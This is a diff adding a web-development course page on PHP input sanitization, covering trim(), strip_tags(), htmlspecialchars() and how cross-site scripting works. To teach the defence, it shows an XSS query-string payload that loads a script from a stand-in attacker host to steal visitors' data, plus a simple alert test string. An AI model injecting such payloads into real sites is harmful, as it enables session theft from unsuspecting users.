@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>SDEV255: PHP - Sanitization</title>
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="32x32"
+      href="./../assets/images/favicon-32x32.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="16x16"
+      href="./../assets/images/favicon-16x16.png"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Arimo:ital,wght@0,400;0,700;1,400;1,700&family=Roboto:ital,wght@0,400;0,700;1,400;1,700&display=swap"
+      rel="stylesheet"
+    />
+    <script src="./../assets/scripts/code_snippets.js" defer></script>
+    <script src="./../assets/scripts/focus_content.js" defer></script>
+    <script src="./../assets/scripts/table_of_contents.js" defer></script>
+
+    <!-- Bootstrap / Sass -->
+    <link rel="stylesheet" href="./../assets/css/styles.css" />
+    <link rel="stylesheet" href="./../assets/css/bootstrap-icons.css" />
+    <script src="./../assets/scripts/bootstrap.bundle.min.js" defer></script>
+  </head>
+  <body class="bg-light">
+    <div class="content-wrapper">
+      <ul>
+        <li>
+          <a href="#sanitization">Sanitization</a>
+          <ul>
+            <li>
+              <a href="#validation-vs-sanitization"
+                >Validation vs Sanitization</a
+              >
+            </li>
+            <li>
+              <a href="#purpose-of-sanitization">Purpose of Sanitization</a>
+            </li>
+            <li>
+              <a href="#removing-unwanted-values">Removing Unwanted Values</a>
+              <ul>
+                <li><a href="#trim">trim()</a></li>
+                <li><a href="#strip_tags">strip_tags()</a></li>
+              </ul>
+            </li>
+            <li>
+              <a href="#escaping-values">Escaping Values</a>
+              <ul>
+                <li>
+                  <a href="#cross-site-scripting-xss"
+                    >Cross-Site Scripting (XSS)</a
+                  >
+                  <ul>
+                    <li><a href="#how-xss-works">How XSS Works</a></li>
+                    <li><a href="#xss-example">XSS Example</a></li>
+                  </ul>
+                </li>
+                <li><a href="#htmlspecialchars">htmlspecialchars()</a></li>
+              </ul>
+            </li>
+            <li><a href="#topics-for-later">Topics for Later</a></li>
+          </ul>
+        </li>
+      </ul>
+      <h1 id="sanitization">Sanitization</h1>
+      <h2 id="validation-vs-sanitization">Validation vs Sanitization</h2>
+      <p>
+        <strong>Validation</strong> - is the process of ensuring that the input
+        matches the expected format, range, type, length, etc.
+      </p>
+      <p>
+        <strong>Sanitization</strong> - is the process of removing unwanted
+        characters, whitespace, HTML tags, etc.
+      </p>
+      <h2 id="purpose-of-sanitization">Purpose of Sanitization</h2>
+      <ul>
+        <li>Prevents malicious code from being injected into application</li>
+        <li>
+          Prevents unwanted characters from being
+          <ul>
+            <li>Displayed to the user</li>
+            <li>Stored in database</li>
+            <li>Stored in files</li>
+            <li>Sent to other applications</li>
+          </ul>
+        </li>
+      </ul>
+      <h2 id="removing-unwanted-values">Removing Unwanted Values</h2>
+      <h3 id="trim">trim()</h3>
+      <ul>
+        <li>Removes whitespace from beginning and end of a string</li>
+        <li>May optionally specify which characters to remove</li>
+      </ul>
+      <pre
+        class="shiki shiki-themes one-light one-dark-pro"
+        style="
+          background-color: #fafafa;
+          --shiki-dark-bg: #282c34;
+          color: #383a42;
+          --shiki-dark: #abb2bf;
+        "
+        tabindex="0"
+      ><code><span class="line"><span style="color:#383A42;--shiki-dark:#56B6C2">&#x3C;</span><span style="color:#383A42;--shiki-dark:#C678DD">?</span><span style="color:#986801;--shiki-dark:#ABB2BF">php</span></span>
+<span class="line"><span style="color:#E45649;--shiki-dark:#E06C75">$cleanedInput</span><span style="color:#383A42;--shiki-dark:#56B6C2"> =</span><span style="color:#0184BC;--shiki-dark:#56B6C2"> trim</span><span style="color:#383A42;--shiki-dark:#ABB2BF">(</span><span style="color:#E45649;--shiki-dark:#E06C75">$userInput</span><span style="color:#383A42;--shiki-dark:#ABB2BF">);</span></span>
+<span class="line"><span style="color:#383A42;--shiki-dark:#C678DD">?</span><span style="color:#383A42;--shiki-dark:#56B6C2">></span></span></code></pre>
+      <h3 id="strip_tags">strip_tags()</h3>
+      <ul>
+        <li>Removes HTML tags from a string</li>
+        <li>May optionally specify which tags to allow</li>
+      </ul>
+      <pre
+        class="shiki shiki-themes one-light one-dark-pro"
+        style="
+          background-color: #fafafa;
+          --shiki-dark-bg: #282c34;
+          color: #383a42;
+          --shiki-dark: #abb2bf;
+        "
+        tabindex="0"
+      ><code><span class="line"><span style="color:#383A42;--shiki-dark:#56B6C2">&#x3C;</span><span style="color:#383A42;--shiki-dark:#C678DD">?</span><span style="color:#986801;--shiki-dark:#ABB2BF">php</span></span>
+<span class="line"><span style="color:#E45649;--shiki-dark:#E06C75">$cleanedInput</span><span style="color:#383A42;--shiki-dark:#56B6C2"> =</span><span style="color:#0184BC;--shiki-dark:#56B6C2"> strip_tags</span><span style="color:#383A42;--shiki-dark:#ABB2BF">(</span><span style="color:#E45649;--shiki-dark:#E06C75">$userInput</span><span style="color:#383A42;--shiki-dark:#ABB2BF">);</span></span>
+<span class="line"><span style="color:#383A42;--shiki-dark:#C678DD">?</span><span style="color:#383A42;--shiki-dark:#56B6C2">></span></span></code></pre>
+      <h2 id="escaping-values">Escaping Values</h2>
+      <p>
+        <strong>Escaping</strong> - is the process of converting special
+        characters to their HTML entity equivalents.
+      </p>
+      <h3 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h3>
+      <p>
+        <strong>Cross-Site Scripting (XSS)</strong> - is a type of injection
+        attack where malicious scripts are injected into trusted websites.
+      </p>
+      <p>The scripts may then:</p>
+      <ul>
+        <li>Steal cookies and session tokens</li>
+        <li>Redirect the user to another website</li>
+        <li>Send content to other applications</li>
+      </ul>
+      <h4 id="how-xss-works">How XSS Works</h4>
+      <ol>
+        <li>
+          Hacker visits a website and probes for query string vulnerabilities.
+        </li>
+      </ol>
+      <figure>
+        <img src="images/hacker.jpg" alt="" style="width: 40%; height: auto" />
+      </figure>
+
+      <ol start="2">
+        <li>
+          <p>
+            Hacker finds query string named <code>q</code> is not sanitized.
+          </p>
+        </li>
+        <li>
+          <p>
+            Hacker tricks other people into visiting website with following
+            query string:
+            <code
+              >q=&lt;script
+              src=http://really-terrible-site/steal-data.js&gt;&lt;/script&gt;</code
+            >
+          </p>
+        </li>
+        <li>
+          <p>
+            JS file runs on victim&#39;s browser and sends data to hacker&#39;s
+            website.
+          </p>
+        </li>
+        <li><p>Hacker sells data on the dark web and buys yacht.</p></li>
+      </ol>
+      <figure>
+        <img
+          src="https://media.boatsnews.com/src/images/news/articles/ima-computer-science-screen-37738.webp"
+          alt=""
+          style="width: 40%; height: auto"
+        />
+      </figure>
+
+      <h4 id="xss-example">XSS Example</h4>
+      <p class="demo">Walkthrough</p>
+
+      <p>
+        <a href="http://localhost/phpbook/section_b/c06/"
+          >Text: Example of an XSS Attack</a
+        >
+      </p>
+      <h3 id="htmlspecialchars">htmlspecialchars()</h3>
+      <ul>
+        <li>Converts special characters to HTML entities</li>
+        <li>
+          May optionally specify which characters to convert and the character
+          encoding
+        </li>
+      </ul>
+      <pre
+        class="shiki shiki-themes one-light one-dark-pro"
+        style="
+          background-color: #fafafa;
+          --shiki-dark-bg: #282c34;
+          color: #383a42;
+          --shiki-dark: #abb2bf;
+        "
+        tabindex="0"
+      ><code><span class="line"><span style="color:#383A42;--shiki-dark:#56B6C2">&#x3C;</span><span style="color:#383A42;--shiki-dark:#C678DD">?</span><span style="color:#986801;--shiki-dark:#ABB2BF">php</span></span>
+<span class="line"><span style="color:#E45649;--shiki-dark:#E06C75">$input</span><span style="color:#383A42;--shiki-dark:#56B6C2"> =</span><span style="color:#50A14F;--shiki-dark:#98C379"> '&#x3C;script>alert("XSS");&#x3C;/script>'</span><span style="color:#383A42;--shiki-dark:#ABB2BF">;</span></span>
+<span class="line"><span style="color:#383A42;--shiki-dark:#C678DD">?</span><span style="color:#383A42;--shiki-dark:#56B6C2">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#383A42;--shiki-dark:#56B6C2">&#x3C;</span><span style="color:#986801;--shiki-dark:#ABB2BF">p</span><span style="color:#383A42;--shiki-dark:#56B6C2">>&#x3C;</span><span style="color:#383A42;--shiki-dark:#C678DD">?</span><span style="color:#986801;--shiki-dark:#ABB2BF">php</span><span style="color:#0184BC;--shiki-dark:#56B6C2"> echo</span><span style="color:#0184BC;--shiki-dark:#56B6C2"> htmlspecialchars</span><span style="color:#383A42;--shiki-dark:#ABB2BF">(</span><span style="color:#E45649;--shiki-dark:#E06C75">$input</span><span style="color:#383A42;--shiki-dark:#ABB2BF">,</span><span style="color:#986801;--shiki-dark:#D19A66"> ENT_QUOTES</span><span style="color:#383A42;--shiki-dark:#ABB2BF">,</span><span style="color:#50A14F;--shiki-dark:#98C379"> 'UTF-8'</span><span style="color:#383A42;--shiki-dark:#ABB2BF">); </span><span style="color:#383A42;--shiki-dark:#C678DD">?</span><span style="color:#383A42;--shiki-dark:#56B6C2">>&#x3C;/</span><span style="color:#986801;--shiki-dark:#ABB2BF">p</span></span></code></pre>
+      <h2 id="topics-for-later">Topics for Later</h2>
+      <p>
+        We have not covered these yet, but santization is also important for:
+      </p>
+      <ul>
+        <li>Database queries</li>
+        <li>File uploads</li>
+      </ul>
+    </div>
+  </body>
+</html>
